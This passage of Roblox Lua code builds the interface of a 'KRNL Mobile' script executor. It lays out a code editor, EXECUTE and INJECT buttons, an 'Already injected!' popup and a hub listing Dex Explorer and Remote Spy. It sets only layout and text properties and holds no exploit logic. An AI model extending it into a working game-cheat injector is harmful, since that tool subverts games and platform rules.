button.Position = UDim2.new(0.910000026, 0, 0.159999996, 0)
button.Size = UDim2.new(0.0409558825, 0, 0.690584838, 0)
button.Font = Enum.Font.SourceSans
button.Text = "−"
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.TextScaled = true
button.TextSize = 35.000
button.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
button.TextWrapped = true

UITextSizeConstraint_7.Parent = button
UITextSizeConstraint_7.MaxTextSize = 35

MainGUI.Name = "MainGUI"
MainGUI.Parent = KrnlGUI
MainGUI.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
MainGUI.BorderColor3 = Color3.fromRGB(0, 0, 0)
MainGUI.Position = UDim2.new(0, 0, 0.168076977, 0)
MainGUI.Size = UDim2.new(0.99999994, 0, 0.831923008, 0)

ExecuteBar.Name = "ExecuteBar"
ExecuteBar.Parent = MainGUI
ExecuteBar.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
ExecuteBar.BorderColor3 = Color3.fromRGB(37, 37, 37)
ExecuteBar.Position = UDim2.new(0.0070000249, 0, 0.00649997452, 0)
ExecuteBar.Size = UDim2.new(0.803592086, 0, 0.88723731, 0)

Frame.Parent = ExecuteBar
Frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
Frame.BorderColor3 = Color3.fromRGB(50, 50, 50)
Frame.Size = UDim2.new(0.999999881, 0, 0.0568133108, 0)

Script1.Name = "Script1"
Script1.Parent = Frame
Script1.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
Script1.BorderColor3 = Color3.fromRGB(50, 50, 50)
Script1.Position = UDim2.new(-0.00180647022, 0, 0, 0)
Script1.Size = UDim2.new(0.156733111, 0, 1.00000775, 0)

TextButton.Parent = Script1
TextButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
TextButton.BorderColor3 = Color3.fromRGB(50, 50, 50)
TextButton.Size = UDim2.new(0.8415097, 0, 0.999998391, 0)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Script1.lua"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextScaled = true
TextButton.TextSize = 16.000
TextButton.TextWrapped = true

UITextSizeConstraint_8.Parent = TextButton
UITextSizeConstraint_8.MaxTextSize = 16

UITextSizeConstraint_9.Parent = TextButton
UITextSizeConstraint_9.MaxTextSize = 16

TextButton_2.Parent = Script1
TextButton_2.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
TextButton_2.BorderColor3 = Color3.fromRGB(50, 50, 50)
TextButton_2.Position = UDim2.new(0.841509819, 0, 0, 0)
TextButton_2.Size = UDim2.new(0.158490166, 0, 0.952832103, 0)
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = "X"
TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.TextScaled = true
TextButton_2.TextSize = 16.000
TextButton_2.TextWrapped = true

UITextSizeConstraint_10.Parent = TextButton_2
UITextSizeConstraint_10.MaxTextSize = 16

UITextSizeConstraint_11.Parent = TextButton_2
UITextSizeConstraint_11.MaxTextSize = 16

Script2.Name = "Script2"
Script2.Parent = Frame
Script2.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
Script2.BorderColor3 = Color3.fromRGB(50, 50, 50)
Script2.Position = UDim2.new(0.159876347, 0, 0, 0)
Script2.Size = UDim2.new(0.156733111, 0, 1.00000775, 0)
Script2.Visible = false

TextButton_3.Parent = Script2
TextButton_3.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
TextButton_3.BorderColor3 = Color3.fromRGB(50, 50, 50)
TextButton_3.Position = UDim2.new(-3.7252903e-09, 0, 0, 0)
TextButton_3.Size = UDim2.new(0.8415097, 0, 0.999998391, 0)
TextButton_3.Font = Enum.Font.SourceSans
TextButton_3.Text = "Script2.lua"
TextButton_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_3.TextScaled = true
TextButton_3.TextSize = 16.000
TextButton_3.TextWrapped = true

UITextSizeConstraint_12.Parent = TextButton_3
UITextSizeConstraint_12.MaxTextSize = 16

UITextSizeConstraint_13.Parent = TextButton_3
UITextSizeConstraint_13.MaxTextSize = 16

TextButton_4.Parent = Script2
TextButton_4.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
TextButton_4.BorderColor3 = Color3.fromRGB(50, 50, 50)
TextButton_4.Position = UDim2.new(0.841509819, 0, 0, 0)
TextButton_4.Size = UDim2.new(0.158490166, 0, 0.952832103, 0)
TextButton_4.Font = Enum.Font.SourceSans
TextButton_4.Text = "X"
TextButton_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_4.TextScaled = true
TextButton_4.TextSize = 16.000
TextButton_4.TextWrapped = true

UITextSizeConstraint_14.Parent = TextButton_4
UITextSizeConstraint_14.MaxTextSize = 16

UITextSizeConstraint_15.Parent = TextButton_4
UITextSizeConstraint_15.MaxTextSize = 16

addbutton.Name = "addbutton"
addbutton.Parent = Frame
addbutton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
addbutton.BackgroundTransparency = 1.000
addbutton.Position = UDim2.new(0.154416174, 0, 0, 0)
addbutton.Size = UDim2.new(0, 19, 0, 13)
addbutton.Font = Enum.Font.SourceSans
addbutton.Text = "+"
addbutton.TextColor3 = Color3.fromRGB(255, 255, 255)
addbutton.TextSize = 17.000

ScrollingFrame1.Name = "ScrollingFrame1"
ScrollingFrame1.Parent = ExecuteBar
ScrollingFrame1.Active = true
ScrollingFrame1.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
ScrollingFrame1.BorderColor3 = Color3.fromRGB(40, 40, 40)
ScrollingFrame1.Position = UDim2.new(0.0127166249, 0, 0.079058826, 0)
ScrollingFrame1.Size = UDim2.new(0.973659992, 0, 0.917334437, 0)
ScrollingFrame1.ScrollBarThickness = 10

ImageLabel_2.Parent = ScrollingFrame1
ImageLabel_2.BackgroundColor3 = Color3.fromRGB(47, 47, 47)
ImageLabel_2.BackgroundTransparency = 1.000
ImageLabel_2.BorderSizePixel = 0
ImageLabel_2.Position = UDim2.new(0.00505135441, 0, -0.0532468483, 27)
ImageLabel_2.Size = UDim2.new(0, 541, 0, 359)
ImageLabel_2.ImageTransparency = 1.000

security.Name = "security"
security.Parent = ImageLabel_2
security.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
security.Size = UDim2.new(0, 552, 0, 258)
security.Visible = false
security.Font = Enum.Font.SourceSans
security.TextColor3 = Color3.fromRGB(0, 0, 0)
security.TextSize = 14.000

EditorFrame.Name = "EditorFrame"
EditorFrame.Parent = ImageLabel_2
EditorFrame.BackgroundColor3 = Color3.fromRGB(37, 37, 37)
EditorFrame.BackgroundTransparency = 1.000
EditorFrame.BorderColor3 = Color3.fromRGB(61, 61, 61)
EditorFrame.Size = UDim2.new(1, 0, 1, 0)
EditorFrame.ZIndex = 3
EditorFrame.BottomImage = "rbxassetid://148970562"
EditorFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
EditorFrame.HorizontalScrollBarInset = Enum.ScrollBarInset.ScrollBar
EditorFrame.MidImage = "rbxassetid://148970562"
EditorFrame.ScrollBarThickness = 5
EditorFrame.TopImage = "rbxassetid://148970562"

Source.Name = "Source"
Source.Parent = EditorFrame
Source.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Source.BackgroundTransparency = 1.000
Source.Position = UDim2.new(0, 19, 0, 0)
Source.Size = UDim2.new(0.965984941, 0, 1, 0)
Source.ZIndex = 3
Source.ClearTextOnFocus = false
Source.Font = Enum.Font.Code
Source.MultiLine = true
Source.PlaceholderColor3 = Color3.fromRGB(204, 204, 204)
Source.Text = "--Welcome To KRNL Mobile!"
Source.TextColor3 = Color3.fromRGB(204, 204, 204)
Source.TextSize = 14.000
Source.TextXAlignment = Enum.TextXAlignment.Left
Source.TextYAlignment = Enum.TextYAlignment.Top

Comments_.Name = "Comments_"
Comments_.Parent = Source
Comments_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Comments_.BackgroundTransparency = 1.000
Comments_.Size = UDim2.new(1, 0, 1, 0)
Comments_.ZIndex = 5
Comments_.Font = Enum.Font.Code
Comments_.Text = ""
Comments_.TextColor3 = Color3.fromRGB(59, 200, 59)
Comments_.TextSize = 14.000
Comments_.TextXAlignment = Enum.TextXAlignment.Left
Comments_.TextYAlignment = Enum.TextYAlignment.Top

Globals_.Name = "Globals_"
Globals_.Parent = Source
Globals_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Globals_.BackgroundTransparency = 1.000
Globals_.Size = UDim2.new(1, 0, 1, 0)
Globals_.ZIndex = 5
Globals_.Font = Enum.Font.Code
Globals_.Text = ""
Globals_.TextColor3 = Color3.fromRGB(85, 222, 154)
Globals_.TextSize = 14.000
Globals_.TextXAlignment = Enum.TextXAlignment.Left
Globals_.TextYAlignment = Enum.TextYAlignment.Top

Keywords_.Name = "Keywords_"
Keywords_.Parent = Source
Keywords_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Keywords_.BackgroundTransparency = 1.000
Keywords_.Size = UDim2.new(1, 0, 1, 0)
Keywords_.ZIndex = 5
Keywords_.Font = Enum.Font.Code
Keywords_.Text = ""
Keywords_.TextColor3 = Color3.fromRGB(213, 53, 117)
Keywords_.TextSize = 14.000
Keywords_.TextXAlignment = Enum.TextXAlignment.Left
Keywords_.TextYAlignment = Enum.TextYAlignment.Top

RemoteHighlight_.Name = "RemoteHighlight_"
RemoteHighlight_.Parent = Source
RemoteHighlight_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
RemoteHighlight_.BackgroundTransparency = 1.000
RemoteHighlight_.Size = UDim2.new(1, 0, 1, 0)
RemoteHighlight_.ZIndex = 5
RemoteHighlight_.Font = Enum.Font.Code
RemoteHighlight_.Text = ""
RemoteHighlight_.TextColor3 = Color3.fromRGB(0, 144, 255)
RemoteHighlight_.TextSize = 14.000
RemoteHighlight_.TextXAlignment = Enum.TextXAlignment.Left
RemoteHighlight_.TextYAlignment = Enum.TextYAlignment.Top

Strings_.Name = "Strings_"
Strings_.Parent = Source
Strings_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Strings_.BackgroundTransparency = 1.000
Strings_.Size = UDim2.new(1, 0, 1, 0)
Strings_.ZIndex = 5
Strings_.Font = Enum.Font.Code
Strings_.Text = ""
Strings_.TextColor3 = Color3.fromRGB(229, 164, 60)
Strings_.TextSize = 14.000
Strings_.TextXAlignment = Enum.TextXAlignment.Left
Strings_.TextYAlignment = Enum.TextYAlignment.Top

Tokens_.Name = "Tokens_"
Tokens_.Parent = Source
Tokens_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tokens_.BackgroundTransparency = 1.000
Tokens_.Size = UDim2.new(1, 0, 1, 0)
Tokens_.ZIndex = 5
Tokens_.Font = Enum.Font.Code
Tokens_.Text = ""
Tokens_.TextColor3 = Color3.fromRGB(255, 255, 255)
Tokens_.TextSize = 14.000
Tokens_.TextXAlignment = Enum.TextXAlignment.Left
Tokens_.TextYAlignment = Enum.TextYAlignment.Top

Numbers_.Name = "Numbers_"
Numbers_.Parent = Source
Numbers_.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Numbers_.BackgroundTransparency = 1.000
Numbers_.Size = UDim2.new(1, 0, 1, 0)
Numbers_.ZIndex = 4
Numbers_.Font = Enum.Font.Code
Numbers_.Text = ""
Numbers_.TextColor3 = Color3.fromRGB(142, 71, 213)
Numbers_.TextSize = 14.000
Numbers_.TextXAlignment = Enum.TextXAlignment.Left
Numbers_.TextYAlignment = Enum.TextYAlignment.Top

Lines.Name = "Lines"
Lines.Parent = EditorFrame
Lines.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Lines.BackgroundTransparency = 1.000
Lines.Position = UDim2.new(-0.00924214441, 0, 0, 0)
Lines.Size = UDim2.new(0, 30, 1, 0)
Lines.ZIndex = 4
Lines.Font = Enum.Font.SourceSans
Lines.Text = "1\\n"
Lines.TextColor3 = Color3.fromRGB(255, 255, 255)
Lines.TextSize = 15.000
Lines.TextYAlignment = Enum.TextYAlignment.Top

ScrollingFrame2.Name = "ScrollingFrame2"
ScrollingFrame2.Parent = ExecuteBar
ScrollingFrame2.Active = true
ScrollingFrame2.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
ScrollingFrame2.BorderColor3 = Color3.fromRGB(40, 40, 40)
ScrollingFrame2.Position = UDim2.new(0.0127166249, 0, 0.079058826, 0)
ScrollingFrame2.Size = UDim2.new(0.973659992, 0, 0.917334437, 0)
ScrollingFrame2.Visible = false
ScrollingFrame2.ScrollBarThickness = 10

ImageLabel_3.Parent = ScrollingFrame2
ImageLabel_3.BackgroundColor3 = Color3.fromRGB(47, 47, 47)
ImageLabel_3.BackgroundTransparency = 1.000
ImageLabel_3.BorderSizePixel = 0
ImageLabel_3.Position = UDim2.new(0.00505135441, 0, -0.0532468483, 27)
ImageLabel_3.Size = UDim2.new(0, 541, 0, 359)
ImageLabel_3.ImageTransparency = 1.000

security_2.Name = "security"
security_2.Parent = ImageLabel_3
security_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
security_2.Size = UDim2.new(0, 552, 0, 258)
security_2.Visible = false
security_2.Font = Enum.Font.SourceSans
security_2.TextColor3 = Color3.fromRGB(0, 0, 0)
security_2.TextSize = 14.000

EditorFrame_2.Name = "EditorFrame"
EditorFrame_2.Parent = ImageLabel_3
EditorFrame_2.BackgroundColor3 = Color3.fromRGB(37, 37, 37)
EditorFrame_2.BackgroundTransparency = 1.000
EditorFrame_2.BorderColor3 = Color3.fromRGB(61, 61, 61)
EditorFrame_2.Size = UDim2.new(1, 0, 1, 0)
EditorFrame_2.ZIndex = 3
EditorFrame_2.BottomImage = "rbxassetid://148970562"
EditorFrame_2.CanvasSize = UDim2.new(0, 0, 0, 0)
EditorFrame_2.HorizontalScrollBarInset = Enum.ScrollBarInset.ScrollBar
EditorFrame_2.MidImage = "rbxassetid://148970562"
EditorFrame_2.ScrollBarThickness = 5
EditorFrame_2.TopImage = "rbxassetid://148970562"

Source_2.Name = "Source"
Source_2.Parent = EditorFrame_2
Source_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Source_2.BackgroundTransparency = 1.000
Source_2.Position = UDim2.new(0, 19, 0, 0)
Source_2.Size = UDim2.new(0.965984941, 0, 1, 0)
Source_2.ZIndex = 3
Source_2.ClearTextOnFocus = false
Source_2.Font = Enum.Font.Code
Source_2.MultiLine = true
Source_2.PlaceholderColor3 = Color3.fromRGB(204, 204, 204)
Source_2.Text = "--Welcome To KRNL Mobile!"
Source_2.TextColor3 = Color3.fromRGB(204, 204, 204)
Source_2.TextSize = 14.000
Source_2.TextXAlignment = Enum.TextXAlignment.Left
Source_2.TextYAlignment = Enum.TextYAlignment.Top

Comments__2.Name = "Comments_"
Comments__2.Parent = Source_2
Comments__2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Comments__2.BackgroundTransparency = 1.000
Comments__2.Size = UDim2.new(1, 0, 1, 0)
Comments__2.ZIndex = 5
Comments__2.Font = Enum.Font.Code
Comments__2.Text = ""
Comments__2.TextColor3 = Color3.fromRGB(59, 200, 59)
Comments__2.TextSize = 14.000
Comments__2.TextXAlignment = Enum.TextXAlignment.Left
Comments__2.TextYAlignment = Enum.TextYAlignment.Top

Globals__2.Name = "Globals_"
Globals__2.Parent = Source_2
Globals__2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Globals__2.BackgroundTransparency = 1.000
Globals__2.Size = UDim2.new(1, 0, 1, 0)
Globals__2.ZIndex = 5
Globals__2.Font = Enum.Font.Code
Globals__2.Text = ""
Globals__2.TextColor3 = Color3.fromRGB(85, 222, 154)
Globals__2.TextSize = 14.000
Globals__2.TextXAlignment = Enum.TextXAlignment.Left
Globals__2.TextYAlignment = Enum.TextYAlignment.Top

Keywords__2.Name = "Keywords_"
Keywords__2.Parent = Source_2
Keywords__2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Keywords__2.BackgroundTransparency = 1.000
Keywords__2.Size = UDim2.new(1, 0, 1, 0)
Keywords__2.ZIndex = 5
Keywords__2.Font = Enum.Font.Code
Keywords__2.Text = ""
Keywords__2.TextColor3 = Color3.fromRGB(213, 53, 117)
Keywords__2.TextSize = 14.000
Keywords__2.TextXAlignment = Enum.TextXAlignment.Left
Keywords__2.TextYAlignment = Enum.TextYAlignment.Top

RemoteHighlight__2.Name = "RemoteHighlight_"
RemoteHighlight__2.Parent = Source_2
RemoteHighlight__2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
RemoteHighlight__2.BackgroundTransparency = 1.000
RemoteHighlight__2.Size = UDim2.new(1, 0, 1, 0)
RemoteHighlight__2.ZIndex = 5
RemoteHighlight__2.Font = Enum.Font.Code
RemoteHighlight__2.Text = ""
RemoteHighlight__2.TextColor3 = Color3.fromRGB(0, 144, 255)
RemoteHighlight__2.TextSize = 14.000
RemoteHighlight__2.TextXAlignment = Enum.TextXAlignment.Left
RemoteHighlight__2.TextYAlignment = Enum.TextYAlignment.Top

Strings__2.Name = "Strings_"
Strings__2.Parent = Source_2
Strings__2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Strings__2.BackgroundTransparency = 1.000
Strings__2.Size = UDim2.new(1, 0, 1, 0)
Strings__2.ZIndex = 5
Strings__2.Font = Enum.Font.Code
Strings__2.Text = ""
Strings__2.TextColor3 = Color3.fromRGB(229, 164, 60)
Strings__2.TextSize = 14.000
Strings__2.TextXAlignment = Enum.TextXAlignment.Left
Strings__2.TextYAlignment = Enum.TextYAlignment.Top

Tokens__2.Name = "Tokens_"
Tokens__2.Parent = Source_2
Tokens__2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tokens__2.BackgroundTransparency = 1.000
Tokens__2.Size = UDim2.new(1, 0, 1, 0)
Tokens__2.ZIndex = 5
Tokens__2.Font = Enum.Font.Code
Tokens__2.Text = ""
Tokens__2.TextColor3 = Color3.fromRGB(255, 255, 255)
Tokens__2.TextSize = 14.000
Tokens__2.TextXAlignment = Enum.TextXAlignment.Left
Tokens__2.TextYAlignment = Enum.TextYAlignment.Top

Numbers__2.Name = "Numbers_"
Numbers__2.Parent = Source_2
Numbers__2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Numbers__2.BackgroundTransparency = 1.000
Numbers__2.Size = UDim2.new(1, 0, 1, 0)
Numbers__2.ZIndex = 4
Numbers__2.Font = Enum.Font.Code
Numbers__2.Text = ""
Numbers__2.TextColor3 = Color3.fromRGB(142, 71, 213)
Numbers__2.TextSize = 14.000
Numbers__2.TextXAlignment = Enum.TextXAlignment.Left
Numbers__2.TextYAlignment = Enum.TextYAlignment.Top

Lines_2.Name = "Lines"
Lines_2.Parent = EditorFrame_2
Lines_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Lines_2.BackgroundTransparency = 1.000
Lines_2.Position = UDim2.new(-0.00924214441, 0, 0, 0)
Lines_2.Size = UDim2.new(0, 30, 1, 0)
Lines_2.ZIndex = 4
Lines_2.Font = Enum.Font.SourceSans
Lines_2.Text = "1\\n"
Lines_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Lines_2.TextSize = 15.000
Lines_2.TextYAlignment = Enum.TextYAlignment.Top

Execute.Name = "Execute"
Execute.Parent = MainGUI
Execute.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
Execute.BorderColor3 = Color3.fromRGB(44, 44, 44)
Execute.Position = UDim2.new(0.00500000967, 0, 0.910000026, 0)
Execute.Size = UDim2.new(0.143999994, 0, 0.074000001, 0)
Execute.Font = Enum.Font.Arial
Execute.Text = "EXECUTE"
Execute.TextColor3 = Color3.fromRGB(255, 255, 255)
Execute.TextScaled = true
Execute.TextSize = 14.000
Execute.TextWrapped = true

UITextSizeConstraint_16.Parent = Execute
UITextSizeConstraint_16.MaxTextSize = 14

Clear.Name = "Clear"
Clear.Parent = MainGUI
Clear.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
Clear.BorderColor3 = Color3.fromRGB(44, 44, 44)
Clear.Position = UDim2.new(0.158899993, 0, 0.910000026, 0)
Clear.Size = UDim2.new(0.143999994, 0, 0.074000001, 0)
Clear.Font = Enum.Font.Arial
Clear.Text = "CLEAR"
Clear.TextColor3 = Color3.fromRGB(255, 255, 255)
Clear.TextScaled = true
Clear.TextSize = 14.000
Clear.TextWrapped = true

UITextSizeConstraint_17.Parent = Clear
UITextSizeConstraint_17.MaxTextSize = 14

OpenFileButton.Name = "Open File Button"
OpenFileButton.Parent = MainGUI
OpenFileButton.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
OpenFileButton.BorderColor3 = Color3.fromRGB(44, 44, 44)
OpenFileButton.Position = UDim2.new(0.31099999, 0, 0.910000026, 0)
OpenFileButton.Size = UDim2.new(0.143999994, 0, 0.074000001, 0)
OpenFileButton.Font = Enum.Font.Arial
OpenFileButton.Text = "OPEN FILE"
OpenFileButton.TextColor3 = Color3.fromRGB(255, 255, 255)
OpenFileButton.TextScaled = true
OpenFileButton.TextSize = 14.000
OpenFileButton.TextWrapped = true

UITextSizeConstraint_18.Parent = OpenFileButton
UITextSizeConstraint_18.MaxTextSize = 14

SaveFileButton.Name = "Save File Button"
SaveFileButton.Parent = MainGUI
SaveFileButton.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
SaveFileButton.BorderColor3 = Color3.fromRGB(44, 44, 44)
SaveFileButton.Position = UDim2.new(0.461996198, 0, 0.910000026, 0)
SaveFileButton.Size = UDim2.new(0.143999994, 0, 0.074000001, 0)
SaveFileButton.Font = Enum.Font.Arial
SaveFileButton.Text = "SAVE FILE"
SaveFileButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SaveFileButton.TextScaled = true
SaveFileButton.TextSize = 14.000
SaveFileButton.TextWrapped = true

UITextSizeConstraint_19.Parent = SaveFileButton
UITextSizeConstraint_19.MaxTextSize = 14

InjectButton.Name = "Inject Button"
InjectButton.Parent = MainGUI
InjectButton.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
InjectButton.BorderColor3 = Color3.fromRGB(44, 44, 44)
InjectButton.Position = UDim2.new(0.611999989, 0, 0.910000026, 0)
InjectButton.Size = UDim2.new(0.143999994, 0, 0.074000001, 0)
InjectButton.Font = Enum.Font.Arial
InjectButton.Text = "INJECT"
InjectButton.TextColor3 = Color3.fromRGB(255, 255, 255)
InjectButton.TextScaled = true
InjectButton.TextSize = 14.000
InjectButton.TextWrapped = true

UITextSizeConstraint_20.Parent = InjectButton
UITextSizeConstraint_20.MaxTextSize = 14

OptionButton.Name = "Option Button"
OptionButton.Parent = MainGUI
OptionButton.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
OptionButton.BorderColor3 = Color3.fromRGB(44, 44, 44)
OptionButton.Position = UDim2.new(0.84799999, 0, 0.910000026, 0)
OptionButton.Size = UDim2.new(0.143999994, 0, 0.074000001, 0)
OptionButton.Font = Enum.Font.Arial
OptionButton.Text = "OPTION"
OptionButton.TextColor3 = Color3.fromRGB(255, 255, 255)
OptionButton.TextScaled = true
OptionButton.TextSize = 14.000
OptionButton.TextWrapped = true

UITextSizeConstraint_21.Parent = OptionButton
UITextSizeConstraint_21.MaxTextSize = 14

ScriptHub.Name = "Script Hub"
ScriptHub.Parent = MainGUI
ScriptHub.Active = true
ScriptHub.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
ScriptHub.BorderColor3 = Color3.fromRGB(33, 33, 33)
ScriptHub.Position = UDim2.new(0.821767807, 0, 0.0278668515, 0)
ScriptHub.Size = UDim2.new(0.170232087, 0, 0.865870535, 0)
ScriptHub.ScrollBarThickness = 7

UIAspectRatioConstraint.Parent = KrnlGUI
UIAspectRatioConstraint.AspectRatio = 1.993

InjectedMessgae.Name = "InjectedMessgae"
InjectedMessgae.Parent = KrnlGUI
InjectedMessgae.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InjectedMessgae.BorderColor3 = Color3.fromRGB(245, 245, 255)
InjectedMessgae.Position = UDim2.new(0.309756339, 0, 0.298481524, 0)
InjectedMessgae.Size = UDim2.new(0.347566962, 0, 0.399907291, 0)
InjectedMessgae.Visible = false

Frame_2.Parent = InjectedMessgae
Frame_2.BackgroundColor3 = Color3.fromRGB(245, 245, 255)
Frame_2.BorderColor3 = Color3.fromRGB(245, 245, 255)
Frame_2.Size = UDim2.new(1, 0, 0.224637687, 0)

Xbutton_2.Name = "X button"
Xbutton_2.Parent = Frame_2
Xbutton_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Xbutton_2.BackgroundTransparency = 1.000
Xbutton_2.Position = UDim2.new(0.849372387, 0, 0, 0)
Xbutton_2.Size = UDim2.new(0.142259419, 0, 1, 0)
Xbutton_2.Font = Enum.Font.SourceSans
Xbutton_2.Text = "X"
Xbutton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
Xbutton_2.TextScaled = true
Xbutton_2.TextSize = 30.000
Xbutton_2.TextWrapped = true

UITextSizeConstraint_22.Parent = Xbutton_2
UITextSizeConstraint_22.MaxTextSize = 30

TextLabel_2.Parent = Frame_2
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(0.0379998684, 0, 0.129181385, 0)
TextLabel_2.Size = UDim2.new(0.242677823, 0, 0.85275197, 0)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "Krnl"
TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.TextSize = 19.000
TextLabel_2.TextWrapped = true
TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left

Frame_3.Parent = InjectedMessgae
Frame_3.BackgroundColor3 = Color3.fromRGB(245, 245, 255)
Frame_3.BorderColor3 = Color3.fromRGB(245, 245, 255)
Frame_3.Position = UDim2.new(0, 0, 0.695652127, 0)
Frame_3.Size = UDim2.new(1, 0, 0.304347813, 0)

Okbutton.Name = "Ok button"
Okbutton.Parent = Frame_3
Okbutton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Okbutton.BorderColor3 = Color3.fromRGB(255, 255, 255)
Okbutton.Position = UDim2.new(0.646688402, 0, 0.214285731, 0)
Okbutton.Size = UDim2.new(0.313807517, 0, 0.5, 0)
Okbutton.Font = Enum.Font.Arial
Okbutton.Text = "OK"
Okbutton.TextColor3 = Color3.fromRGB(0, 0, 0)
Okbutton.TextScaled = true
Okbutton.TextSize = 13.000
Okbutton.TextWrapped = true

UITextSizeConstraint_23.Parent = Okbutton
UITextSizeConstraint_23.MaxTextSize = 13

TextLabel_3.Parent = InjectedMessgae
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.Position = UDim2.new(0.0631046072, 0, 0.379999995, 0)
TextLabel_3.Size = UDim2.new(0.870292902, 0, 0.231884062, 0)
TextLabel_3.Font = Enum.Font.SourceSans
TextLabel_3.Text = "Already injected!"
TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 15.000
TextLabel_3.TextWrapped = true
TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left

UITextSizeConstraint_24.Parent = TextLabel_3
UITextSizeConstraint_24.MaxTextSize = 15

HScriptsHub.Name = "HScriptsHub"
HScriptsHub.Parent = KrnlGUI
HScriptsHub.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
HScriptsHub.BorderColor3 = Color3.fromRGB(43, 43, 43)
HScriptsHub.Position = UDim2.new(0.231226563, 0, 0.165179193, 0)
HScriptsHub.Size = UDim2.new(0.202141464, 0, 0.518720329, 0)
HScriptsHub.Visible = false

DexExplorer.Name = "Dex Explorer"
DexExplorer.Parent = HScriptsHub
DexExplorer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DexExplorer.BackgroundTransparency = 1.000
DexExplorer.Size = UDim2.new(1, 0, 0.128491625, 0)
DexExplorer.Font = Enum.Font.SourceSans
DexExplorer.Text = "             Dex Explorer"
DexExplorer.TextColor3 = Color3.fromRGB(255, 255, 255)
DexExplorer.TextScaled = true
DexExplorer.TextSize = 15.000
DexExplorer.TextWrapped = true
DexExplorer.TextXAlignment = Enum.TextXAlignment.Left

UITextSizeConstraint_25.Parent = DexExplorer
UITextSizeConstraint_25.MaxTextSize = 15

OpenGui.Name = "OpenGui"
OpenGui.Parent = HScriptsHub
OpenGui.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
OpenGui.BackgroundTransparency = 1.000
OpenGui.Position = UDim2.new(0, 0, 0.128491625, 0)
OpenGui.Size = UDim2.new(1, 0, 0.128491625, 0)
OpenGui.Font = Enum.Font.SourceSans
OpenGui.Text = "              OpenGui"
OpenGui.TextColor3 = Color3.fromRGB(255, 255, 255)
OpenGui.TextScaled = true
OpenGui.TextSize = 15.000
OpenGui.TextWrapped = true
OpenGui.TextXAlignment = Enum.TextXAlignment.Left

UITextSizeConstraint_26.Parent = OpenGui
UITextSizeConstraint_26.MaxTextSize = 15

RemoteSpy.Name = "RemoteSpy"
RemoteSpy.Parent = HScriptsHub
RemoteSpy.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
RemoteSpy.BackgroundTransparency = 1.000
RemoteSpy.Position = UDim2.new(0, 0, 0.25698325, 0)
RemoteSpy.Size = UDim2.new(1, 0, 0.128491625, 0)
RemoteSpy.Font = Enum.Font.SourceSans
RemoteSpy.Text = "              Remote Spy"
RemoteSpy.TextColor3 = Color3.fromRGB(255, 255, 255)
RemoteSpy.TextScaled = true
RemoteSpy.TextSize = 15.000
RemoteSpy.TextWrapped = true
RemoteSpy.TextXAlignment = Enum.TextXAlignment.Left

UITextSizeConstraint_27.Parent = RemoteSpy
